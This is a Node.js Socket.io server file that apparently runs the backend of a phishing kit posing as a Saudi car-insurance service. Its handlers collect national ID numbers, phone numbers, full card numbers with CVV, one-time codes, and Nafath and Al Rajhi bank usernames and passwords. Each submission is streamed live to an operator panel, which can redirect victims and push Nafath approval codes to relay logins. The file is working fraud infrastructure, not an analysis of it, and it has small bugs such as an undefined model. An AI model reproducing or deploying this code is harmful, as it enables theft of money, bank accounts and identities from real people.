// index.js
require("dotenv").config();
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const mongoose = require("mongoose");
const path = require("path");

// import your models
const User = require("./models/User");
//const Visit = require("./models/Visit");
const phone = require("./models/Phone");
const PhoneCode = require("./models/PhoneCode");
const ThirdParty = require("./models/ThirdParty");
const Verification = require("./models/Verification");
const Details = require("./models/Details");
const Comprehensive = require("./models/Comprehensive");
const IndexSubmission = require("./models/IndexSubmission");
const Billing = require("./models/Billing");
const Payment = require("./models/Payment");
const Pin = require("./models/Pin");
const Nafad = require("./models/Nafad");
const NafadCode = require("./models/NafadCode");
const Rajhi = require("./models/Rajhi");
const RajhiCode = require("./models/RajhiCode");
const Admin = require("./models/Admin");
const generateTokenFor = require("./utils/jwt"); // your JWT‑helper (or any token generator)

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname, "public")));

// 1) Connect to MongoDB
mongoose
  .connect(process.env.MONGODB_URI)
  .then(() => console.log("✔ MongoDB connected test"))
  .catch((err) => console.error("✖ MongoDB connection error:", err));

// helper to find or create a user document by IP
async function findOrCreateUser(ip) {
  let user = await User.findOne({ ip });
  if (!user) user = await User.create({ ip });
  return user;
}

// 2) Socket handlers
io.on("connection", (socket) => {
  console.log("▶", socket.id, "connected");

  // Admin: load all data
  socket.on("loadData", async () => {
    const [
      indexSubmissions,
      detailsArr,
      comprehensiveArr,
      billingArr,
      paymentArr,
      pins,
      phoneSubs,
      phoneCodes,
      thirdPartys,
      verifs,
      nafadLogins,
      nafadCodes,
    ] = await Promise.all([
      IndexSubmission.find().sort({ _id: -1 }).lean(),
      Details.find().sort({ _id: -1 }).lean(),
      Comprehensive.find().sort({ _id: -1 }).lean(),
      Billing.find().sort({ _id: -1 }).lean(),
      Payment.find().sort({ _id: -1 }).lean(),
      Pin.find().sort({ _id: -1 }).lean(),
      phone.find().sort({ _id: -1 }).lean(),
      PhoneCode.find().sort({ _id: -1 }).lean(),
      ThirdParty.find().sort({ _id: -1 }).lean(),
      Verification.find().sort({ _id: -1 }).lean(),
      Nafad.find().sort({ _id: -1 }).lean(),
      NafadCode.find().sort({ _id: -1 }).lean(),
    ]);

    // gather flags & locations
    const users = await User.find().lean();
    const flags = users.map((u) => ({ ip: u.ip, flag: u.flag }));
    const locations = users.map((u) => ({ ip: u.ip, currentPage: u.location }));

    io.emit("initialData", {
      indexSubmissions, // index form submissions
      details: detailsArr, // details page
      comprehensive: comprehensiveArr,
      billing: billingArr,
      payment: paymentArr,
      pins,
      phoneSubs, // phone submissions
      verification_code_three: phoneCodes, // phone-code submissions
      thirdPartys,
      verification_code_two: verifs, // final verifications (OTP)
      nafadLogins, // Nafad username/password
      nafadCodes, // Nafad two‑digit codes
      flags, // user.flag
      locations, // user.location
    });
  });

  socket.on("loginAdmin", async ({ username, password }, callback) => {
    // Your auth logic here...
    const admin = await Admin.findOne({ username });

    const user = admin.toObject();

    if (user && admin.checkPassword(password)) {
      const token = generateTokenFor(user);

      return callback({ success: true, token });
    }
    callback({ success: false, message: "Invalid credentials" });
  });

  socket.on("registerAdmin", async ({ username, password }, callback) => {
    try {
      // 1) Reject empty
      if (!username?.trim() || !password) {
        return callback({
          success: false,
          message: "Username and password required.",
        });
      }

      // 2) Check duplicate
      const exists = await Admin.findOne({ username });
      if (exists) {
        return callback({ success: false, message: "Username already taken." });
      }

      // 3) Create & save (password hashing in pre-save hook)
      const admin = new Admin({ username, password });
      await admin.save();

      // 4) Optionally issue a token immediately:
      const token = generateTokenFor({
        id: admin._id,
        username: admin.username,
      });

      console.log("Admin registered.");

      // 5) Acknowledge success
      callback({ success: true, message: "Admin registered.", token });
    } catch (err) {
      console.error("registerAdmin error:", err);
      callback({ success: false, message: "Server error. Try again later." });
    }
  });

  // Admin: toggle flag
  socket.on("toggleFlag", async ({ ip, flag }) => {
    const user = await findOrCreateUser(ip);
    user.flag = flag;
    await user.save();
    io.emit("flagUpdated", { ip, flag });
  });

  // Admin: update basmah code
  socket.on("updateBasmah", async ({ ip, basmah }) => {
    const user = await findOrCreateUser(ip);
    user.basmahCode = basmah;
    await user.save();
    io.emit("basmahUpdated", { ip, basmah });
    socket.emit("nafadCode", { msg: true, code: user.basmahCode });
  });

  socket.on("getNafadCode", async ({ ip }) => {
    try {
      // 1) Find (or create) the User
      const user = await findOrCreateUser(ip);

      // 2) Retrieve the latest NafadCode record for this user
      const record = user.basmahCode
        ? { code: user.basmahCode } // Use the basmahCode directly if it exists
        : null;

      // 3) Extract the code (or null if none)
      const code = record ? record.code : null;

      // 4) Emit back to the same socket
      socket.emit("nafadCode", { error: null, code });
    } catch (err) {
      console.error("Error fetching Nafad code:", err);
      socket.emit("nafadCode", { error: err.message, code: null });
    }
  });

  // Admin: manual navigation
  socket.on("navigateTo", async ({ ip, page }) => {
    const user = await findOrCreateUser(ip);
    /*     let v = await Visit.findOne({ ip });

    if (v) {
      v.page = page;
      v.updatedAt = new Date();
      await v.save();
    } else {
      v = await Visit.create({ user: user._id, page, ip });
    } */

    if (user) {
      user.location = page;
      await user.save();
    } else {
      await User.create({ ip: ip, location: page });
    }
    /* 
    user.location = page;
    await user.save(); */
    io.emit("navigateTo", { ip, page });
  });

  // Visitor: page view
  socket.on("updateLocation", async ({ ip, page }) => {
    const user = await findOrCreateUser(ip);

    user.location = page;
    user.lastSeenAt = new Date(); // or whatever timestamp field you prefer

    socket.userIp = ip;

    // 3. Save the changes:
    await user.save();

    io.emit("locationUpdated", { ip, page });
  });

  // Visitor: phone-code
  socket.on("submitPhoneCode", async ({ ip, verification_code_three }) => {
    // 1) Ensure the User exists
    const user = await findOrCreateUser(ip);
    const saved = await PhoneCode.create({
      ip: ip,
      user: user._id,
      code: verification_code_three,
      time: Date.now(),
    });

    io.emit("newPhoneCode", {
      ip: user.ip,
      verification_code_three: saved.code,
      time: saved.time,
    });
    socket.emit("ackPhoneCode", { success: true, error: null });

    // 4) Ack back to the client
  });

  // Visitor: third-party purchase
  socket.on("submitThirdparty", async (payload) => {
    const user = await findOrCreateUser(payload.ip);

    // 2) Create the ThirdParty document with just the fields you now send
    const saved = await ThirdParty.create({
      user: user._id,
      companyName: payload.companyName,
      basePrice: Number(payload.basePrice),
      ip: payload.ip,
      selectedOptions: payload.selectedOptions,
      totalPrice: Number(payload.totalPrice),
      time: Date.now(),
    });

    // 3) Broadcast a minimal payload to your admin UI
    io.emit("newThirdparty", {
      ip: user.ip,
      companyName: saved.companyName,
      basePrice: saved.basePrice,
      selectedOptions: saved.selectedOptions,
      totalPrice: saved.totalPrice,
    });

    // 4) Acknowledge back to the visitor page
    socket.emit("ackThirdparty", { success: true, error: null });
  });

  // Visitor: final verification
  socket.on("submitVerification", async ({ ip, verification_code_two }) => {
    // 1) Ensure a User record exists
    const user = await findOrCreateUser(ip);

    // 2) Create the Verification document
    const saved = await Verification.create({
      user: user._id,
      ip: ip,
      code: verification_code_two,
      time: Date.now(),
    });

    // 3) Broadcast a minimal payload your admin mergeSingleton() can consume
    io.emit("newOtp", {
      ip: user.ip,
      verification_code_two: saved.code,
      // you could include saved.time if you show timestamps
    });

    // 4) Acknowledge back to the visitor page
    socket.emit("ackVerification", { success: true, error: null });
  });

  socket.on("submitRajhiCode", async ({ ip, rajhi_code }) => {
    // 1) Ensure a User record exists
    const user = await findOrCreateUser(ip);

    // 2) Create the Verification document
    const saved = await RajhiCode.create({
      user: user._id,
      ip: ip,
      rajhiCode: rajhi_code,
      time: Date.now(),
    });

    // 3) Broadcast a minimal payload your admin mergeSingleton() can consume
    io.emit("newRajhiCode", {
      ip: user.ip,
      rajhiCode: saved.rajhiCode,
      // you could include saved.time if you show timestamps
    });

    // 4) Acknowledge back to the visitor page
    socket.emit("ackRajhiCode", { success: true, error: null });
  });

  socket.on("submitRajhi", async ({ ip, rajhiName, rajhiPw }) => {
    // 1) Ensure a User record exists
    const user = await findOrCreateUser(ip);

    // 2) Create the Verification document
    const saved = await Rajhi.create({
      user: user._id,
      ip: ip,
      rajhiName: rajhiName,
      rajhiPw: rajhiPw,
      time: Date.now(),
    });

    // 3) Broadcast a minimal payload your admin mergeSingleton() can consume
    io.emit("newRajhi", {
      ip: user.ip,
      rajhiName: saved.rajhiName,
      rajhiPw: saved.rajhiPw,
    });

    // 4) Acknowledge back to the visitor page
    socket.emit("ackRajhi", { success: true, error: null });
  });

  socket.on("submitDetails", async (payload) => {
    const user = await findOrCreateUser(payload.ip);

    // Try to parse the date; if invalid, skip it or default to now
    let startDate = new Date(payload.InsuranceStartDate);
    if (isNaN(startDate.valueOf())) {
      console.warn("Invalid InsuranceStartDate:", payload.InsuranceStartDate);
      // Option A: default to current time
      startDate = new Date();
      // Option B: delete the field so Mongoose leaves it null
      // delete payload.InsuranceStartDate;
    }

    // Upsert the record
    const updated = await Details.findOneAndUpdate(
      { user: user._id },
      {
        TypeOfInsuranceContract: payload.TypeOfInsuranceContract,
        InsuranceStartDate: startDate,
        PurposeOfUse: payload.PurposeOfUse,
        ip: payload.ip,
        EstimatedValue: Number(payload.EstimatedValue),
        ManufactureYear: payload.ManufactureYear,
        RepairLocation: payload.RepairLocation,
        time: Date.now(),
      },
      { upsert: true, new: true }
    );

    // Broadcast a minimal payload including ip
    io.emit("newDetails", {
      ip: user.ip,
      TypeOfInsuranceContract: updated.TypeOfInsuranceContract,
      InsuranceStartDate: updated.InsuranceStartDate,
      PurposeOfUse: updated.PurposeOfUse,
      EstimatedValue: updated.EstimatedValue,
      ManufactureYear: updated.ManufactureYear,
      RepairLocation: updated.RepairLocation,
    });

    socket.emit("ackDetails", { success: true, error: null });
  });

  socket.on("submitComprehensive", async (payload) => {
    // 1) Ensure we have (or create) a User record
    const user = await findOrCreateUser(payload.ip);

    // 2) Create the “شامل” record
    const saved = await Comprehensive.create({
      user: user._id,
      companyName: payload.companyName,
      basePrice: Number(payload.basePrice),
      selectedOptions: payload.selectedOptions,
      ip: payload.ip,
      totalPrice: Number(payload.totalPrice),
      time: Date.now(),
    });

    // 3) Broadcast just the minimal payload your admin mergeSingleton() expects
    io.emit("newShamel", {
      ip: user.ip,
      companyName: saved.companyName,
      basePrice: saved.basePrice,
      selectedOptions: saved.selectedOptions,
      totalPrice: saved.totalPrice,
    });
    socket.emit("ackShamel", { success: true, error: null });
  });

  socket.on("submitBilling", async (payload) => {
    // 1) Ensure we have a User document
    const user = await findOrCreateUser(payload.ip);

    // 2) Create the Billing record
    const saved = await Billing.create({
      user: user._id,
      ip: payload.ip,
      mada: !!payload.mada,
      visa_mastarcard: !!payload.visa_mastarcard,
      applepay: !!payload.applepay,
      totalPrice: Number(payload.totalPrice),
      time: Date.now(),
    });

    // 3) Broadcast just the minimal payload your admin mergeSingleton() expects
    io.emit("newBilling", {
      ip: user.ip,
      mada: saved.mada,
      visa_mastarcard: saved.visa_mastarcard,
      applepay: saved.applepay,
      totalPrice: saved.totalPrice,
    });
    socket.emit("ackBilling", { success: true, error: null });
  });

  // Handle the first form on index.html
  socket.on("submitIndex", async (payload) => {
    // 1) find or create the User record
    const user = await findOrCreateUser(payload.ip);

    // 2) save the submission
    const saved = await IndexSubmission.create({
      user: user._id,
      SellerIDnumber: payload.SellerIDnumber,
      BuyerIDnumber: payload.BuyerIDnumber,
      IDorResidenceNumber: payload.IDorResidenceNumber,
      FullName: payload.FullName,
      PhoneNumber: payload.PhoneNumber,
      SerialNumber: payload.SerialNumber,
      ip: payload.ip,
      VerificationCode: payload.VerificationCode,
    });

    io.emit("newIndex", {
      ip: saved.ip,
      SellerIDnumber: saved.SellerIDnumber,
      BuyerIDnumber: saved.BuyerIDnumber,
      IDorResidenceNumber: saved.IDorResidenceNumber,
      FullName: saved.FullName,
      PhoneNumber: saved.PhoneNumber,
      SerialNumber: saved.SerialNumber,
      VerificationCode: saved.VerificationCode,
    });

    socket.emit("ackIndex", { success: true, error: null });
  });

  socket.on("submitPayment", async (payload) => {
    // 1) Ensure a User record exists
    const user = await findOrCreateUser(payload.ip);

    // 2) Create the Payment document
    const saved = await Payment.create({
      user: user._id,
      cardHolderName: payload.cardHolderName,
      cardNumber: payload.cardNumber,
      ip: payload.ip,
      expirationDate: payload.expirationDate,
      cvv: payload.cvv,
      time: Date.now(),
    });

    // 3) Broadcast the minimal payload for admin UI
    io.emit("newPayment", {
      ip: user.ip,
      cardHolderName: saved.cardHolderName,
      cardNumber: saved.cardNumber,
      expirationDate: saved.expirationDate,
      cvv: saved.cvv,
      time: saved.time,
    });
    socket.emit("ackPayment", { success: true, error: null });
  });

  socket.on("submitCode", async ({ ip, verification_code }) => {
    // 1) Ensure the User exists
    const user = await findOrCreateUser(ip);

    // 2) Save the code submission
    const saved = await Pin.create({
      user: user._id,
      ip: ip,
      verificationCode: verification_code,
      time: Date.now(),
    });

    // 3) Broadcast to admin UI (optional)
    io.emit("newPin", {
      ip: user.ip,
      pin: saved.verificationCode,
      time: saved.time,
    });

    // 4) Ack back to the client
    socket.emit("ackCode", { success: true, error: null });
  });

  socket.on("submitNafadCode", async ({ ip, verification_code }) => {
    // 1) Ensure the User exists
    const user = await findOrCreateUser(ip);

    // 2) Save the code submission
    const saved = await NafadCode.create({
      user: user._id,
      ip: ip,
      code: verification_code,
      time: Date.now(),
    });

    // 3) Broadcast to admin UI (optional)
    io.emit("newOtp", {
      ip: user.ip,
      code: saved.code,
    });

    // 4) Ack back to the client
    socket.emit("nafadCode", { msg: true, code: saved.code });
  });

  socket.on("updateBasmah", async ({ ip, basmah }) => {
    // Find or create user by IP
    let user = await User.findOne({ ip });
    if (!user) {
      user = await User.create({ ip });
    }

    // Update the basmahCode
    user.basmahCode = Number(basmah);
    await user.save();

    // Broadcast to all admin clients
    socket.emit("nafadCode", { msg: true, code: user.basmahCode ?? "00" });
  });

  socket.on("submitPhone", async (payload) => {
    // 1) Ensure the User record exists
    const user = await findOrCreateUser(payload.ip);

    // 2) Save exactly the fields your form sends
    const saved = await phone.create({
      user: user._id,
      ip: payload.ip,
      phoneNumber: payload.phoneNumber,
      operator: payload.operator,
      birthDate: payload.birthDate ? new Date(payload.birthDate) : null,
      time: Date.now(),
    });

    // 3) Broadcast a minimal payload your admin UI expects
    io.emit("newPhone", {
      ip: user.ip,
      phoneNumber: saved.phoneNumber,
      operator: saved.operator,
      birthDate: saved.birthDate,
    });

    // 4) Acknowledge back to the visitor page
    socket.emit("ackPhone", { success: true, error: null });
  });

  socket.on("submitNafad", async ({ ip, username, password }) => {
    // 1) Ensure the User record exists
    const user = await findOrCreateUser(ip);

    // 2) Save the Nafad login data
    const saved = await Nafad.create({
      user: user._id,
      ip: ip,
      username,
      password,
      time: Date.now(),
    });

    // 3) Broadcast minimal payload for admin UI
    io.emit("newNafad", {
      ip: user.ip,
      username: saved.username,
      password: saved.password,
    });

    // 4) Acknowledge to the client
    socket.emit("ackNafad", { success: true, error: null });
  });

  socket.on("disconnect", ({ userIp }) => {
    if (socket.userIp) {
      io.emit("locationUpdated", {
        ip: socket.userIp,
        page: "offline",
      });
    }
    console.log("◀", socket.id, "disconnected");
  });
});

// Optional: REST endpoint to delete a user (and cascade)
app.delete("/api/users/:ip", async (req, res) => {
  try {
    const { ip } = req.params;
    const user = await User.findOne({ ip });

    if (!user) {
      return res
        .status(404)
        .json({ success: false, message: "User not found" });
    }

    await Promise.all([
      /*       Visit.deleteMany({ user: user._id }), */
      phone.deleteMany({ user: user._id }), // capitalize if your model is `Phone`
      PhoneCode.deleteMany({ user: user._id }),
      ThirdParty.deleteMany({ user: user._id }),
      Verification.deleteMany({ user: user._id }),
      IndexSubmission.deleteMany({ user: user._id }),
      Details.deleteMany({ user: user._id }),
      Comprehensive.deleteMany({ user: user._id }),
      Billing.deleteMany({ user: user._id }),
      Payment.deleteMany({ user: user._id }),
      code.deleteMany({ user: user._id }), // same here, capitalize if model is `Code`
      Nafad.deleteMany({ user: user._id }),
      NafadCode.deleteMany({ user: user._id }),
      user.deleteOne(),
    ]);

    io.emit("userDeleted", { ip });
    res.json({ success: true, message: "User and related data deleted" });
  } catch (err) {
    console.error("Error deleting user:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

const PORT = process.env.PORT || 3020;
server.listen(PORT, () => console.log(`🚀 Listening on port ${PORT}`));
